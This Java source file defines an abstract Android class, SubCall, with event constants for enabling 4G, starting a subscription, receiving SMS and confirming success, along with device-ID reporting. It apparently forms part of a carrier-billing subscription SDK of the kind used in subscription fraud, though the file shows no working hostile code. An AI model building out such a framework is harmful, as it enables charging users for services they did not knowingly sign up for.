package com.enhtmv.sublib.common;


import com.cp.plugin.event.SubEvent;
import com.enhtmv.sublib.common.http.SubProxy;
import com.enhtmv.sublib.common.http.SubHttp;
import com.enhtmv.sublib.common.util.SubLog;


public abstract class SubCall {


    public static final String INSTALLED = "installed";

    //打开通知
    public static final String OPEN_NOTIFICATION = "open_notification";

    //4g网络
    public static final String OPEN_4G_NETWORK = "open_4g_network";

    //发起订阅
    public static final String SUB_REQEUST = "sub_reqeust";

    //收到短信
    public static final String RECEIVE_SMS = "receive_sms";

    //订阅成功
    public static final String SUB_SUCCESS = "sub_success";

    public static final String CALL_JAVASCRIPT = "call_javascript";


    protected String androidId;

    protected String packageName;

    protected String host;

    protected SubCallBack<String> successCall;

    protected SubReport report;

    private SubProxy proxy;

    protected SubEvent event;

    protected String operatorName;

    private boolean log;

    public SubCall(String host, String operatorName, SubEvent subEvent) {
        this.host = host;
        this.operatorName = operatorName;
        this.event = subEvent;
    }

    void init(String packageName, String androidId, SubCallBack<String> successCall) {

        this.packageName = packageName;
        this.androidId = androidId;
        this.successCall = successCall;

        this.report = SubReport.getReport();

    }

    public void setLog(boolean log) {
        this.log = log;
        SubLog.setLog(log);
    }

    public void setProxy(SubProxy proxy) {
        this.proxy = proxy;
    }


    protected SubHttp http() {

        SubHttp http = new SubHttp();

        http.setLog(this.log);

        if (this.proxy != null) {
            http.setProxy(proxy);
        }


        return http;
    }


    public void report(String tag) {
        report(tag, operatorName);
    }

    public void report(String tag, String info) {


        report.s(tag, info);

        event.onMessage(tag, info);


    }

    public abstract void sub(String meta);

    public abstract void onSub(String message);


}
